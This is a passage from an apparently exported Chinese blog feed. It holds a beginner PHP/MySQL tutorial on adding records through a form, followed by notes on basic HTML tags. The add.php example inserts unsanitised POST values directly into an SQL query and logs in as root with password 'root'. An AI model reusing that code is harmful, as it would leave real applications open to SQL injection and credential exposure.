data-original="https://img-blog.csdnimg.cn/20201111001906464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>确认修改：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111001232855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>修改后：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111002036147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="实现增加"><a href="#实现增加" class="headerlink" title="实现增加"></a>实现增加</h5><p>添加数据也是，点击按钮后跳转到添加数据的页面add.html，因为id是自增，所以不需要填id：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>添加数据<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>添加数据<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>add.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        姓名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        年龄：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        国家：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>county<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>注：1蜀国 2吴国 3魏国<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>确认添加<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>input</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111002512651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>添加数据：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111002543302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>确认添加后，会跳转到add.php执行SQL语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">// 接收数据</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$county</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'county'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//连接数据库</span>    <span class="token variable">$link</span> <span class="token operator">=</span> @<span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">'localhost'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'root'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//添加数据</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"insert into student(name,age,classID) value('$name',$age,$county)"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token boolean">true</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据添加成功！'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'数据添加失败！'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;a href='index.php'>返回&lt;/a>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回index页面查看，这里因为序号是自增，前面测试时序号就到了23了，所以数据再添加就是24了。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201111002718849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础</title>
      <link href="/posts/e173abca.html"/>
      <url>/posts/e173abca.html</url>
      
        <content type="html"><![CDATA[<h3 id="基础标签"><a href="#基础标签" class="headerlink" title="基础标签"></a>基础标签</h3><pre class="line-numbers language-html"><code class="language-html">HTML基本标签标签            名称            示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>        标题标签        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>静夜思<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        段落和换行标签    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>床前明月光<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>疑是地上霜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span>            水平线标签    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>        斜体        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>zh举头望明月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>    字体加粗        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>低头思故乡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>快捷键TAB自动代码补全学习方法：w3cSchool帮助手册,官网图片标签常见图片格式:jpg、gif、hmp、png网页中常用的pnggif支持动画jpg支持透明度语法<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>图片路径<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>图片出错,用文字替代<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>图片宽度<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>图片高度<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>img后面的src类似的代表属性绝对路径E:\HTML\images\向日葵.jpg相对路径images\向日葵.jpg../4.txt 返回上一级目录找4.txt../../返回上一级的上一级网页背景设置 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>图片路径<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>超链接<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>链接地址<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>目标窗口位置<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文本或图像<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>目标窗口位置_self:自身窗口            _blank：新建窗口            例如:target="_blank"超链接的应用1、页面间连接:A页到B页,网上常见连接<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test.html<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>作者:李白<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>2、锚链接:跳转自身固定位置,或A页跳转到B页固定位置,需锚记声明要跳转的位置href="#register"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#register<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>静夜思<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>跳转到的位置name="register"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>床前明月光，<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>要跳转到另一个网页指定位置当前网页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test.html#register<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>作者:李白<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>需跳转网页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>hello world!!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>3、功能性链接:电子邮件、QQ、MSN等链接    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>练习：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta  charset<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta  name<span class="token operator">=</span><span class="token string">"Keywords"</span> content<span class="token operator">=</span><span class="token string">"关键字"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"Description"</span> content<span class="token operator">=</span><span class="token string">"简介、描述"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>    这是title     <span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>诗词<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>静夜思<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span>床前明月光<span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>疑是地上霜<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span><span class="token operator">&lt;</span>em<span class="token operator">></span>举头望明月<span class="token operator">&lt;</span><span class="token operator">/</span>em<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>strong<span class="token operator">></span>低头思故乡<span class="token operator">&lt;</span><span class="token operator">/</span>strong<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>网址导航<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span>    <span class="token operator">&lt;</span>ul<span class="token operator">></span>        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.biadu.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.360.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span><span class="token number">360</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.51cto.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>51cto<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>        <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.youku.com"</span><span class="token operator">></span>优酷<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>图片展示<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/images/1.jpg"</span> width<span class="token operator">=</span><span class="token string">"500px"</span><span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020103000584846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="多媒体标签"><a href="#多媒体标签" class="headerlink" title="多媒体标签"></a>多媒体标签</h3><pre class="line-numbers language-php"><code class="language-php">    图片展示    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/1.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>500px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>    音乐播放    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/mus/反方向的钟.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>正在播放：反方向的钟<span class="token punctuation">.</span>mp3<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>视频播放<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/mus/mss.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>正在播放：杭州美术生<span class="token punctuation">.</span>mp4<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><pre class="line-numbers language-php"><code class="language-php">    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token 